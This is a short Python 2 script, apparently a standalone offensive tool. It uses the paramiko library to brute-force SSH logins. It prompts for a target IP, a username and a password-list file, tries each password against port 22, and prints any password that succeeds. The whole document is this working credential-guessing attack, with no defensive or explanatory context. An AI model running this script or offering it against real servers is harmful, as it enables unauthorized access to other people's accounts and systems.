import paramiko

s = paramiko.SSHClient();
s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
s.load_system_host_keys();

ip = raw_input("Enter The IP = ")
print "**********\n"
user = raw_input("Enter The Username = ")
print "**********\n"
passlist = raw_input("Enter The Passlist = ")
print "**********\n"
file = open(passlist , "r")

for pass_ in file.readlines():

    password = pass_.strip("\n")
    try:
        s.connect(ip , port=22 , username=user , password=str(password), timeout=1 , allow_agent=False , look_for_keys=False)
        print "\n\n\t\t[*] Password Has Been Found [*]\n\n ",password

    except paramiko.AuthenticationException as e:

        print("[!] Password invalid ");